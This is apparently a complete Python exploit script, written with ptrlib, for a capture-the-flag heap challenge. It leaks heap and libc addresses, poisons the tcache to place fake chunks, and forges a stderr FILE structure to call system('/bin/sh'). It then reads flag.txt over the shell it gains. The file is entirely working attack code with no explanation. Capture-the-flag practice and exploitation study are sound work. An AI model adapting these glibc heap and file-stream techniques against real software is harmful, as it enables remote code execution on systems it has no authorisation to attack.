#!/usr/bin/env python3
from ptrlib import *
import time
from logging import FATAL
import os

getLogger("ptrlib").setLevel(FATAL)


def create(index):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", index)


def read(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", index)
    return sock.recvline()


def update(index, data):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", index)
    sock.sendafter(": ", data)


def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", index)


libc = ELF("./libc.so.6")
# sock = Process("./chall")
HOST = os.getenv("CTF4B_HOST", "0.0.0.0")
PORT = int(os.getenv("CTF4B_PORT", "9005"))
sock = remote(HOST, PORT)

# leak heap
create(0)
delete(0)
create(0)
heap_base = u64(read(0)) << 12
logger.info("heap = " + hex(heap_base))

# create fake chunk on tcache manager (size)
create(1)
delete(0)
delete(1)
addr_chunk1 = heap_base + 0x330
link_to = heap_base + 0x10
update(-1, p64((addr_chunk1 >> 12) ^ link_to))
create(0)
create(1)

# create fake chunk on tcache manager (next)
create(2)
delete(0)
delete(2)
addr_chunk2 = heap_base + 0x3C0
link_to = heap_base + 0xC0
update(-1, p64((addr_chunk2 >> 12) ^ link_to))
create(0)
create(2)


def alloc_at(index, addr):
    update(1, p16(0) * 7 + p16(1))  # tcache count
    update(2, p64(0) + p64(addr))  # tcache link
    create(index)


# create fake chunk
update(0, p64(0) + p64(0x421))
alloc_at(3, heap_base + 0x3D0)  # fake chunk
alloc_at(4, heap_base + 0x3C0 + 0x420)
update(4, p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21))

# leak libc
delete(3)
create(3)
libc.base = u64(read(3)) - libc.main_arena() - 0x450
delete(3)
delete(0)

# fsop
alloc_at(3, libc.symbol("_IO_2_1_stderr_"))
alloc_at(0, libc.symbol("_IO_2_1_stderr_") + 0x80)
fake_file = flat(
    [
        0x3B01010101010101,
        u64(b"/bin/sh\0"),  # flags / rptr
        0,
        0,  # rend / rbase
        0,
        1,  # wbase / wptr
        0,
        0,  # wend / bbase
        0,
        0,  # bend / savebase
        0,
        0,  # backupbase / saveend
        0,
        0,  # marker / chain
    ],
    map=p64,
)
fake_file += p64(libc.symbol("system"))  # __doallocate
fake_file += b"\x00" * (0x88 - len(fake_file))
fake_file += p64(libc.base + 0x21BA70)  # lock
fake_file += b"\x00" * (0xA0 - len(fake_file))
fake_file += p64(libc.symbol("_IO_2_1_stderr_"))  # wide_data
fake_file += b"\x00" * (0xC0 - len(fake_file))
fake_file += p32(1)  # mode (!=0)
fake_file += b"\x00" * (0xD8 - len(fake_file))
fake_file += p64(libc.base + 0x2160C0 - 0x58 + 0x18)  # vtable (_IO_wfile_jumps)
fake_file += p64(libc.symbol("_IO_2_1_stderr_") + 8)  # _wide_data->_wide_vtable
assert len(fake_file) < 0x100
update(3, fake_file[:0x80])
update(0, fake_file[0x80:])

# win!
time.sleep(1)
sock.sendline("5")

sock.sendline("echo shell")
sock.sendlineafter("shell\n", "cat flag.txt")
print(sock.recvline().decode())
